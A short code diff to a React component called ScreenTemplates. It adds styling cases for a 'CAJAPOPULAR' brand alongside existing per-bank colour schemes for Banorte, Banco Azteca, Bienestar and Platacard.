@@ -940,6 +940,8 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return 'bg-[#00A552] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
       case 'BIENESTAR':
         return 'bg-[#9D2449] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
+      case 'CAJAPOPULAR':
+        return 'bg-[#1B4D3E] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
       default:
         return 'bg-[#EC1C24] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors'; // Banorte por defecto
     }
@@ -967,6 +969,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case 'PLATACARD': return 'bg-[#333333] text-white p-2';
       case 'BANCO_AZTECA': return 'bg-[#00A552] text-white p-2';
       case 'BIENESTAR': return 'bg-[#9D2449] text-white p-2';
+      case 'CAJAPOPULAR': return 'bg-[#1B4D3E] text-white p-2';
       default: return 'bg-gray-100 p-3 text-center font-semibold';
     }
   };
@@ -989,6 +992,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case 'PLATACARD': return 'bg-white p-4 rounded-lg shadow border-t-2 border-[#FF5722]';
       case 'BANCO_AZTECA': return 'bg-white p-4 rounded-lg shadow border-t-2 border-[#00A552]';
       case 'BIENESTAR': return 'bg-white p-4 rounded-lg shadow border-t-2 border-[#9D2449]';
+      case 'CAJAPOPULAR': return 'bg-white p-4 rounded-lg shadow border-t-2 border-[#1B4D3E]';
       default: return '';
     }
   };
